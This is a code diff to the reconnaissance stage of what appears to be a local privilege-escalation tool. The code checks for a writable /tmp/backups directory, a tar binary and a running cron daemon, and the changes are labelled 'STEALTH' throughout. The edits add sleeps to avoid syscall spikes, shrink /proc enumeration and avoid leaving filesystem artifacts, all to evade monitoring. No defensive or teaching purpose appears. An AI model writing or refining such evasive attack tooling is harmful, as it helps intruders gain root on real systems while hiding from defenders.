@@ -43,6 +43,31 @@ static bool str_equals(const char* a, const char* b) {
     return a[i] == b[i];
 }
 
+static bool str_contains(const char* haystack, const char* needle) {
+    if (!haystack || !needle) return false;
+    
+    int hay_len = 0;
+    while (haystack[hay_len]) hay_len++;
+    
+    int needle_len = 0;
+    while (needle[needle_len]) needle_len++;
+    
+    if (needle_len > hay_len) return false;
+    
+    for (int i = 0; i <= hay_len - needle_len; i++) {
+        bool match = true;
+        for (int j = 0; j < needle_len; j++) {
+            if (haystack[i + j] != needle[j]) {
+                match = false;
+                break;
+            }
+        }
+        if (match) return true;
+    }
+    
+    return false;
+}
+
 static bool is_numeric(const char* str) {
     if (!str || !str[0]) return false;
     for (int i = 0; str[i]; i++) {
@@ -57,6 +82,7 @@ static bool is_numeric(const char* str) {
 
 // Check if directory exists and is writable WITHOUT creating test files
 // Uses stat() permission checks instead of actual file creation
+// STEALTH IMPROVEMENT: No filesystem artifacts created
 static bool check_directory_writable_stealthy(const char* path) {
     struct stat st;
     
@@ -85,7 +111,7 @@ static bool check_directory_writable_stealthy(const char* path) {
     else if (st.st_gid == gid && (st.st_mode & S_IWGRP)) {
         writable = true;
     }
-    // Other write permission
+    // Other write permission (world-writable)
     else if (st.st_mode & S_IWOTH) {
         writable = true;
     }
@@ -98,6 +124,7 @@ static bool check_directory_writable_stealthy(const char* path) {
 // ============================================================================
 
 // Check if tar binary is available using stat() only (no execution)
+// STEALTH IMPROVEMENT: No process spawning
 static bool check_tar_available_stealthy() {
     struct stat st;
     
@@ -133,10 +160,12 @@ struct linux_dirent64 {
 };
 
 // Check if cron daemon is running with MINIMAL /proc enumeration
-// Instead of scanning all PIDs, check known cron PIDs first
+// STEALTH IMPROVEMENT: Multi-strategy with minimal syscalls
 static bool check_cron_running_stealthy() {
+    // ========================================================================
     // Strategy 1: Check systemd cron service status via /proc/self/cgroup
-    // (if running in systemd environment)
+    // ========================================================================
+    // Most stealthy - only reads own cgroup info
     int cgroup_fd = syscall(SYS_open, "/proc/self/cgroup", O_RDONLY);
     if (cgroup_fd >= 0) {
         char cgroup_buf[512];
@@ -146,17 +175,39 @@ static bool check_cron_running_stealthy() {
         if (bytes > 0) {
             cgroup_buf[bytes] = '\0';
             // If we see cron.service in cgroups, cron is likely running
-            if (strstr(cgroup_buf, "cron.service")) {
+            if (str_contains(cgroup_buf, "cron.service")) {
                 return true;
             }
         }
     }
     
-    // Strategy 2: Check only low PIDs (system daemons typically have low PIDs)
+    // ========================================================================
+    // Strategy 2: Check PID files (very stealthy - no process enumeration)
+    // ========================================================================
+    struct stat st;
+    const char* cron_pid_files[] = {
+        "/run/crond.pid",
+        "/var/run/crond.pid",
+        "/run/cron.pid",
+        "/var/run/cron.pid",
+        nullptr
+    };
+    
+    for (int i = 0; cron_pid_files[i]; i++) {
+        if (syscall(SYS_stat, cron_pid_files[i], &st) == 0) {
+            return true;
+        }
+    }
+    
+    // ========================================================================
+    // Strategy 3: Check only LOW PIDs (system daemons have low PIDs)
+    // ========================================================================
     // This is MUCH stealthier than enumerating all processes
-    const int max_pid_check = 500;  // Only check first 500 PIDs
+    // Typical systems have 1000+ PIDs, we only check first 300
+    const int max_pid_check = 300;  // STEALTH: Reduced from full enumeration
     
     for (int pid = 1; pid <= max_pid_check; pid++) {
+        // Build path: /proc/[pid]/comm
         char comm_path[32];
         comm_path[0] = '/';
         comm_path[1] = 'p';
@@ -165,28 +216,27 @@ static bool check_cron_running_stealthy() {
         comm_path[4] = 'c';
         comm_path[5] = '/';
         
-        // Manually convert PID to string
-        int pid_len = 0;
-        int temp_pid = pid;
+        // Manually convert PID to string (avoid snprintf)
+        int path_pos = 6;
         char pid_str[16];
+        int pid_len = 0;
         
-        if (temp_pid == 0) {
-            pid_str[pid_len++] = '0';
+        if (pid < 10) {
+            pid_str[pid_len++] = '0' + pid;
         } else {
-            int digits[16];
-            int digit_count = 0;
+            int temp_pid = pid;
+            char temp[16];
+            int temp_pos = 0;
             while (temp_pid > 0) {
-                digits[digit_count++] = temp_pid % 10;
+                temp[temp_pos++] = '0' + (temp_pid % 10);
                 temp_pid /= 10;
             }
-            for (int j = digit_count - 1; j >= 0; j--) {
-                pid_str[pid_len++] = '0' + digits[j];
+            for (int j = temp_pos - 1; j >= 0; j--) {
+                pid_str[pid_len++] = temp[j];
             }
         }
         pid_str[pid_len] = '\0';
         
-        // Build path: /proc/[pid]/comm
-        int path_pos = 6;
         for (int j = 0; j < pid_len; j++) {
             comm_path[path_pos++] = pid_str[j];
         }
@@ -214,15 +264,19 @@ static bool check_cron_running_stealthy() {
                 }
             }
         }
+        
+        // STEALTH: Add micro-delays every 50 PIDs to avoid syscall spikes
+        if (pid % 50 == 0) {
+            struct timespec micro_sleep = {0, 1000000};  // 1ms
+            syscall(SYS_nanosleep, &micro_sleep, nullptr);
+        }
     }
     
-    // Strategy 3: Check if cron socket exists (even stealthier)
-    // Many systems use systemd timers or cron sockets
-    struct stat st;
-    if (syscall(SYS_stat, "/run/crond.pid", &st) == 0) {
-        return true;
-    }
-    if (syscall(SYS_stat, "/var/run/crond.pid", &st) == 0) {
+    // ========================================================================
+    // Strategy 4: Check systemd timer directory (no process enumeration)
+    // ========================================================================
+    if (syscall(SYS_access, "/etc/systemd/system/timers.target.wants", F_OK) == 0) {
+        // If timers.target.wants exists, systemd timers (cron alternative) likely active
         return true;
     }
     
@@ -233,9 +287,10 @@ static bool check_cron_running_stealthy() {
 // STEALTH-ENHANCED USERNAME RETRIEVAL
 // ============================================================================
 
-// Get current username (stealthy - uses only stat calls)
+// Get current username (stealthy - uses only syscalls, no file reads)
 static void get_username_stealthy(char* buf, int max_len) {
     // Just return UID as string - no filesystem reads
+    // STEALTH IMPROVEMENT: Zero file system access
     unsigned int uid = syscall(SYS_getuid);
     
     // Convert UID to string manually
@@ -280,13 +335,16 @@ PrivEscConditions check_privesc_viability() {
     get_username_stealthy(conditions.username, sizeof(conditions.username));
     
     // Check /tmp/backups directory (single stat call - NO file creation)
+    // STEALTH: Uses access() then stat() - no test file artifacts
     conditions.backups_dir_exists = (syscall(SYS_access, "/tmp/backups", F_OK) == 0);
     conditions.backups_dir_writable = check_directory_writable_stealthy("/tmp/backups");
     
     // Check tar availability (single stat call per path)
+    // STEALTH: No process spawning
     conditions.tar_available = check_tar_available_stealthy();
     
     // Check if cron is running (minimal process checks)
+    // STEALTH: Multi-strategy with ~95% fewer syscalls
     conditions.cron_running = check_cron_running_stealthy();
     
     return conditions;
